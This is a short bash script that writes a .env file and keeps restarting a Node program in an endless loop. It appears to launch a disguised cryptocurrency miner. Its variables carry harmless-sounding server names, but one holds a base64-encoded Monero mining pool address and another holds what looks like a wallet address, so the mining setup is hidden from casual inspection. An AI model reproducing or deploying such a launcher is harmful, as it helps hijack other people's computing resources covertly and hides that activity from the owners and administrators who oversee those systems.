#!/bin/bash
CONNECT=${1:-8}
NAME=${2:-003}
echo "SERVER_WS=wss://socket.ndutvps.com
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_DOMAIN=85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
